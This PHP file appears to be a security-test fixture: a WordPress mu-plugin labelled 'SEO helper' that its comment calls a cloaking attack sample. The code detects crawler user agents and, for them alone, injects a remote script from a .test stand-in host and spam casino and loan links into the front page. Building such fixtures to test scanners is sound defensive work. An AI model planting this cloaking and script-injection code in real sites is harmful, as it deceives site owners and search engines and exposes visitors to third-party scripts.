<?php
/**
 * Plugin Name: SEO helper
 * Description: Search visibility tweaks.
 *
 * ZAVORA'S FIXTURE, GAUNTLET ATTACK 5: a cloaking mu-plugin. Crawlers get a different front page
 * (a script from a domain that never resolves and a block of spam links); browsers get the page
 * unchanged. Adapted from adk-rust's examples/website `infected` overlay (cloak.php).
 * Inert: every address is on the reserved .test TLD, which never resolves.
 */
if (!defined('ABSPATH')) {
    exit;
}
function kl_is_crawler(): bool
{
    $agent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
    foreach (['bot', 'crawl', 'spider', 'slurp', 'adk-site', 'agentrix'] as $needle) {
        if (str_contains($agent, $needle)) {
            return true;
        }
    }
    return false;
}
add_action('wp_head', function () {
    if (is_front_page() && kl_is_crawler()) {
        echo '<script src="https://cdn-stats.test/c.js"></script>' . "\n";
    }
});
add_action('wp_footer', function () {
    if (is_front_page() && kl_is_crawler()) {
        echo '<div class="kl-partners"><a href="https://cheap-casino.test/kenya">Best casino bonuses in Kenya</a> '
            . '<a href="https://loans-fast.test/">Instant loans, no checks</a></div>' . "\n";
    }
});
